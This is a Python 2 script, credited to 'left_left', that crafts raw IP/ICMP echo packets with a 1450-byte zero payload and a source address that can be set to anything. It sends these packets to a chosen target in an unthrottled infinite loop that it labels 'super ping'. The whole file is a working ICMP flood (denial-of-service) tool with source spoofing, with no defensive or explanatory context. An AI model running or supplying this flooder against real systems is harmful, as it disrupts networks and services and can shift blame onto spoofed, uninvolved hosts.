#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:left_left
import socket
import struct
import time
import sys

from optparse import OptionParser

def chksum(packet):
    sum = 0
    i = 0
    p_len = len(packet)

    while i < p_len-1:
        sum = (ord(packet[i]) << 8) + ord(packet[i+1]) + sum
        i += 2
        
    if p_len/2 & 1:
        sum += ord(packet[p_len-1])
        
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    sum = sum ^ 0xffff
    
    return sum

def get_data(src_ip, dst_ip):
    try:
        src_bin = socket.inet_aton(src_ip)
    except socket.error, e:
        print "src address error: %s" % e
        exit(1)

    try:
        dst_bin = socket.inet_aton(dst_ip)
    except socket.error, e:
        print "dst address error: %s" % e
        exit(1)

    tcp_header = struct.pack('bbHHHbbH', 0x45, 0, 1490, 12736, 
                            0, 64, 1, 0) + src_bin + dst_bin
    sum = chksum(tcp_header)
    tcp_header = struct.pack('bbHHHbbH', 0x45, 0, 1490, 12736, 
                            0, 64, 1, socket.htons(sum)) + src_bin + dst_bin
    icmp_header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    sum = chksum(icmp_header)
    icmp_header = struct.pack('bbHHh', 8, 0, socket.htons(sum), 1, 1)
    icmp_data = b'\x00' * 1450

    return tcp_header + icmp_header + icmp_data

def get_opt():
    parser = OptionParser()
    parser.add_option("-s", "--src", dest="src_ip",
            default=socket.gethostbyname(socket.gethostname()),
            help="src ip address.")
    parser.add_option("-d", "--dst", dest="dst_ip",
            help="dst ip address.")
    
    (options, args) = parser.parse_args()
    return options

def main():
    options = get_opt()
    src_ip = options.src_ip
    dst_ip = options.dst_ip

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error, e:
        print "Create socket error: %s" %e
        exit(1)

    send_data = get_data(src_ip, dst_ip)

    try:
        s.sendto(send_data, (dst_ip, 1))
    except socket.error, e:
        print "dst address error: %s" % e
        exit(1)
    
    print "Now begin super ping from %s to %s" %(src_ip, dst_ip)
    i = 1
    while 1:
        s.sendto(send_data, (dst_ip, 1))
        i += 1
        if i%10000 == 0:
            print "%d packets sent..." % i
        #time.sleep(0.1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "super ping closed..."
